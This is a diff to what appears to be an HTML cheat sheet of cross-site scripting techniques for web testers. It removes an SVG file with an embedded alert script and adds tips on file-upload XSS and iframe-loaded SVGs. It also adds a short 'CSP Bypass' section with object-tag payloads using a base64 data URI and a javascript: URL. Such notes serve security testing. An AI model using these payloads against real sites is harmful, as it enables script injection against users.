@@ -45,16 +45,12 @@ Injecting anchor tag without whitespaces -breaking up characters with decoded va
  <h3> File Upload XSS </h3><br>
  If you find a file upload feature, try naming the file to an xss payload. Use burp intercept to rename files <br>
  Does the app allow .svg files to be uploaded? if yes, enter the code within an svg file <br>
- <code><?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-
-<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
-   <script type="text/javascript">
-      alert('XSS!');
-   </script>
-</svg>
- </code>
+ If you can insert IFRAMES into the app, use the src=link to an svg file. <br>
+ <br>
+ <h3> CSP Bypass </h3><br>
+ This will work for script-src self: <br>
+ <.object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object.> <br>
+ <.object data="javascript:alert(1)".> (firefox) <br>
 
 <br>
 <h2>A href bypasses</h2>
